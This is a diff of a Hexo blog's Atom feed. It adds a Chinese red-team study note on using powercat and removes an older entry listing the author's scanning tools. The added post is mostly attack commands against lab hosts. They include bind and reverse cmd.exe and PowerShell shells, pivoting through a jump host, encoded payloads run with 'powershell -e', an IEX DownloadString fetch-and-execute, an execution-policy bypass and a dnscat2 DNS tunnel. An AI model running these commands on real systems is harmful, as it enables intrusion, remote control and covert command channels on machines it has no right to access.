@@ -6,7 +6,7 @@
   <link href="https://www.teamssix.com/atom.xml" rel="self"/>
   
   <link href="https://www.teamssix.com/"/>
-  <updated>2021-05-28T05:15:41.428Z</updated>
+  <updated>2021-06-01T08:01:13.069Z</updated>
   <id>https://www.teamssix.com/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【内网学习笔记】8、powercat 的使用</title>
+    <link href="https://www.teamssix.com/year/210601-155103.html"/>
+    <id>https://www.teamssix.com/year/210601-155103.html</id>
+    <published>2021-06-01T07:51:03.000Z</published>
+    <updated>2021-06-01T08:01:13.069Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="1、下载安装-powercat"><a href="#1、下载安装-powercat" class="headerlink" title="1、下载安装 powercat"></a>1、下载安装 powercat</h2><p>powercat 可以视为 nc 的 powershell 版本，因此也可以和 nc 进行连接。</p><p>powercat 可在 github 进行下载，项目地址为：<a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p><p>下载下来 powercat.ps1 文件后，直接导入即可</p><pre><code> Import-Module .\powercat.ps1</code></pre><p>如果提示未能加载指定模块，则可能是权限问题，可以参照之前写的 <a href="https://teamssix.com/year/210206-191859.html">【内网学习笔记】2、PowerShell</a> 文章中的方法对其赋予权限，即在管理员模式下运行以下命令</p><pre><code>Set-ExecutionPolicy Unrestricted</code></pre><p>之后就可以导入 powercat 了，导入成功后，输入 powercat -h 可以看到帮助信息。</p><p>如果没有权限，也可以直接下载远程文件进行绕过。</p><pre><code>IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;)</code></pre><p>不过由于 github 在国内可能会无法打开，因此可以使用 web 代理站点或者把 powercat.ps1 文件放到自己的服务器上进行下载。</p><h2 id="2、powercat-的使用"><a href="#2、powercat-的使用" class="headerlink" title="2、powercat 的使用"></a>2、powercat 的使用</h2><p>powercat 命令参数</p><pre><code>-l        监听模式-p        指定监听端口-e        指定启动进程的名称-v        显示详情-c        指定想要连接的 IP 地址-ep        返回 powershell-dns    使用 dns 通信-g        生成 payload-ge        生成经过编码的 payload，可以直接使用 powershell -e 执行该 payload</code></pre><p>可以看到和 nc 的命令还是很相似的。</p><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>Kali 上的 nc 连接到靶机</p><pre><code>nc -v rhost rport</code></pre><pre><code>nc -v 172.16.214.21 4444</code></pre><p>靶机开启监听，等待 Kali 连接</p><pre><code>powercat -l -v -p lport -e cmd.exe</code></pre><pre><code>powercat -l -v -p 4444 -e cmd.exe</code></pre><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>Kali 上开启监听</p><pre><code>nc -lvp 4444</code></pre><p>靶机向 kali 发起连接</p><pre><code>powercat -c rhost -p rport -e cmd.exe</code></pre><pre><code>powercat -c 172.16.214.46 -p 4444 -e cmd.exe</code></pre><h3 id="返回-powershell"><a href="#返回-powershell" class="headerlink" title="返回 powershell"></a>返回 powershell</h3><p>攻击机上运行</p><pre><code>powercat -l -v -p lport</code></pre><pre><code>powercat -l -v -p 4444</code></pre><p>靶机上运行</p><pre><code>powercat -c rhost -p rport -v -ep</code></pre><pre><code>powercat -c 172.16.214.21 -p 4444 -v -ep</code></pre><h3 id="作为跳板使用"><a href="#作为跳板使用" class="headerlink" title="作为跳板使用"></a>作为跳板使用</h3><p>测试环境为：</p><pre><code>kali            172.16.214.47windows7    172.16.214.2windows10    172.16.214.21</code></pre><p>将 win7 作为跳板机，让 kali 通过 win7 连接到 windows10</p><p>在 win10 中执行以下命令</p><pre><code>powercat -l -v -p 4444 -e cmd.exe</code></pre><p>在 win7 中执行以下命令</p><pre><code>powercat -l -v -p 5555 -r tcp:172.16.214.21:4444</code></pre><p>最后在 kali 下连接 win7</p><pre><code>nc -v 172.16.214.2 5555</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-01_14-23-47.png"></p><h3 id="powercat-生成-payload"><a href="#powercat-生成-payload" class="headerlink" title="powercat 生成 payload"></a>powercat 生成 payload</h3><p>在攻击机上运行以下命令生成 shell.ps1 payload 文件</p><pre><code>powercat -l -p 4444 -e cmd -g &gt; shell.ps1</code></pre><p>将 shell.ps1 文件拷贝到目标主机上后，执行 shell.ps1 文件</p><p>之后在攻击机上运行以下命令即可获得 shell</p><pre><code>powercat -c rhost -p rport -v</code></pre><pre><code>powercat -c 172.16.214.21 -p 4444 -v </code></pre><p>反向连接也可以</p><p>在攻击机上生成 ps1 文件，并开启监听</p><pre><code>powercat -c rhost -p rport -ep -g &gt; shell.ps1</code></pre><pre><code>powercat -c 172.16.214.2 -p 4444 -ep -g &gt; shell.ps1</code></pre><pre><code>powercat -l -p 4444 -v</code></pre><p>之后在靶机上，运行 ps1 文件就会上线了，如果不想生成文件，也可以使用 -ge 生成经过编码的 payload</p><p>在攻击机上生成 payload，并开启监听</p><pre><code>powercat -c 172.16.214.2 -p 4444 -ep -ge</code></pre><pre><code>powercat -l -p 4444 -v</code></pre><p>在靶机上执行刚生成的 payload</p><pre><code>powershell -e payload</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-01_15-35-24.png"></p><h3 id="建立-dns-隧道连接"><a href="#建立-dns-隧道连接" class="headerlink" title="建立 dns 隧道连接"></a>建立 dns 隧道连接</h3><p>powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。</p><p>在服务端上安装 dnscat ，以 kali 为例</p><pre><code>git clone https://github.com/iagox86/dnscat2.gitcd dnscat2/server/gem install bundlerbundle install</code></pre><p>命令运行完之后，执行以下命令开启服务端</p><pre><code>ruby dnscat2.rb powercat -e open --no-cache</code></pre><p>在靶机下，执行以下命令，建立 dns 隧道</p><pre><code>powercat -c 172.16.214.47 -p 53 -dns powercat -e cmd.exe</code></pre><p>此时，在 kali 上就能看到回连的会话了</p><pre><code>sessions                #    查看所有会话session -i 1         #    选择指定的会话进行交互</code></pre><p>不过实测，虽然能返回会话，但不能执行命令，暂不清楚原因是什么。</p><p>powercat 暂时就记录这些，其他的比如文件传输什么的就不记了，毕竟使用频率几乎为零，平时使用最多的可能还是拿它来反弹 shell，不过为什么不用 CS 或者 MSF 呢，不更香嘛。</p><blockquote><p>参考链接：</p><p><a href="https://blog.csdn.net/qq_32393893/article/details/108904697">https://blog.csdn.net/qq_32393893/article/details/108904697</a></p><p><a href="https://cloud.tencent.com/developer/article/1772183">https://cloud.tencent.com/developer/article/1772183</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;1、下载安装-powercat&quot;&gt;&lt;a href=&quot;#1、下载安装-powercat&quot; class=&quot;headerlink&quot; title=&quot;1、下载安装 powercat&quot;&gt;&lt;/a&gt;1、下载安装 powercat&lt;/h2&gt;&lt;p&gt;powercat 可以视为 nc 的</summary>
+      
+    
+    
+    
+    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
+    
+    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
+    
+  </entry>
   
   <entry>
     <title>【内网学习笔记】7、lcx、netcat和socat的使用</title>
@@ -546,29 +574,6 @@
     <category term="shiro" scheme="https://www.teamssix.com/tags/shiro/"/>
     
     <category term="RCE" scheme="https://www.teamssix.com/tags/RCE/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【工具分享】分享几个平时经常用到的小工具</title>
-    <link href="https://www.teamssix.com/year/200613-134525.html"/>
-    <id>https://www.teamssix.com/year/200613-134525.html</id>
-    <published>2020-06-13T05:45:25.000Z</published>
-    <updated>2020-06-13T05:54:02.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>平时自己偶然会根据需要写点小工具，但是一直没上传到我的Github上（其实是因为太懒），今天把一些自己平时使用比较频繁的一些小工具上传到我的Github上，有问题的可以反馈，有喜欢的可以给个Star，嘿嘿。</p><a id="more"></a><h1 id="小工具"><a href="#小工具" class="headerlink" title="小工具"></a>小工具</h1><h2 id="dirsearch-single"><a href="#dirsearch-single" class="headerlink" title="dirsearch-single"></a>dirsearch-single</h2><p>地址：<a href="https://github.com/teamssix/dirsearch-single">https://github.com/teamssix/dirsearch-single</a></p><p>介绍：在平时会碰到一个目标的多个资产都是使用的同一个CMS，当发现了一个站点的漏洞时，可能其他站点也存在此漏洞，此时就可以对这些URL进行单个目录的批量检测了。</p><h2 id="fckeditor-dircheck"><a href="#fckeditor-dircheck" class="headerlink" title="fckeditor-dircheck"></a>fckeditor-dircheck</h2><p>地址：<a href="https://github.com/teamssix/fckeditor-dircheck">https://github.com/teamssix/fckeditor-dircheck</a></p><p>介绍：此工具主要对fckeditor编辑器的上传路径进行检测，目录字典为<code>dir_fckeditor.txt</code>，各位大佬也可以根据自己需求、经验进行字典的添加。</p><h2 id="http-sys-check"><a href="#http-sys-check" class="headerlink" title="http.sys-check"></a>http.sys-check</h2><p>地址：<a href="https://github.com/teamssix/http.sys-check">https://github.com/teamssix/http.sys-check</a></p><p>介绍：由于在网上没有找到合适的批量检测http.sys漏洞的工具，于是自己简单写了一个，在这里分享出来。</p><h2 id="springboot-check"><a href="#springboot-check" class="headerlink" title="springboot-check"></a>springboot-check</h2><p>地址：<a href="https://github.com/teamssix/springboot-check">https://github.com/teamssix/springboot-check</a></p><p>介绍：由于在网上没有找到满意的springboot敏感目录检测的工具，于是就自己简单写了一个，dir_springboot.txt为检测的字典，都是从网上收集来的，各位大佬也可以自己根据自己需要进行添加。</p><h2 id="url-survival-check"><a href="#url-survival-check" class="headerlink" title="url-survival-check"></a>url-survival-check</h2><p>地址：<a href="https://github.com/teamssix/url-survival-check">https://github.com/teamssix/url-survival-check</a></p><p>介绍：由于平时在做资产梳理的时候，往往会遇到对大量URL进行存活检测的工作，有时候有的URL使用http能打开，有的则使用https才能打开，手动去检测效率太低，因此简单写了一个批量检测工具。</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>上面这些工具由于主要是平时自己使用，因此写的比较粗糙。各位大佬在使用过程中，如果碰到Bug，可以在Github上进行反馈。</p><p>除了上述工具外，还有一些工具因为存在的Bug比较多、误报率较高而没有上传到我的Github上，后期等成熟的时候，会一一上传上去。</p><p>如果上面的工具有帮助到你，欢迎给个star或Github的关注，最后祝各位大佬HW顺利。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;平时自己偶然会根据需要写点小工具，但是一直没上传到我的Github上（其实是因为太懒），今天把一些自己平时使用比较频繁的一些小工具上传到我的Github上，有问题的可以反馈，有喜欢的可以给个Star，嘿嘿。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
-    
-    
-    <category term="工具分享" scheme="https://www.teamssix.com/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
-    
-    <category term="Github" scheme="https://www.teamssix.com/tags/Github/"/>
     
   </entry>
   
